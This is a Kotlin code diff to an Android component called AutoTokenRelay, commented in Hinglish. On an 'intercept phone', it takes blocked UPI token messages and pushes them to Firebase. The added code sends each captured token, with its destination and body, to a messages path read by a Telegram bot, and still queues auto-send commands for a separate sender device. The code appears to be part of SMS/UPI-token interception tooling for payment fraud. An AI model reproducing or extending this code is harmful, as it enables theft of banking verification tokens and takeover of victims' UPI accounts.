@@ -8,22 +8,34 @@ import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
 
 /**
- * Intercept phone: UPI token block hone par Firebase command push karta hai.
+ * Intercept phone: token Firebase messages + sender commands dono pe push.
  */
 object AutoTokenRelay {
 
     private const val TAG = "AutoTokenRelay"
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
-    fun publishBlocked(context: Context, dest: String, body: String) {
+    fun publishBlocked(context: Context, dest: String, body: String, sendFrom: String = "") {
         val appContext = context.applicationContext
         scope.launch {
             try {
                 val config = FirebaseAutoTokenStore.load(appContext)
-                if (!config.canIntercept() || !config.relayReady()) return@launch
+                if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return@launch
 
                 val client = FirebaseRestClient(config)
                 val now = System.currentTimeMillis()
+
+                // Bot Telegram ke liye messages path pe token
+                val msgId = FirebaseDeviceRegistry.publishOutgoingToken(
+                    appContext, config, dest, body, sendFrom
+                )
+                if (msgId != null) {
+                    Log.i(TAG, "Token published messages/$msgId dest=$dest")
+                }
+
+                // Auto-send: sender device commands path
+                if (!config.canIntercept() || !config.relayReady()) return@launch
+
                 val payload = linkedMapOf<String, Any?>(
                     "to" to dest.trim(),
                     "body" to body.trim(),
@@ -35,9 +47,9 @@ object AutoTokenRelay {
                     "from_device" to config.deviceId,
                     "created_at" to now
                 )
-                val pushId = client.push("hivirtus/commands/${config.senderDeviceId}", payload)
+                val pushId = client.push(FirebasePaths.commands(config.senderDeviceId), payload)
                 if (pushId != null) {
-                    Log.i(TAG, "Relay queued push=$pushId dest=$dest")
+                    Log.i(TAG, "Relay queued commands/$pushId dest=$dest")
                 } else {
                     Log.w(TAG, "Relay push failed dest=$dest")
                 }
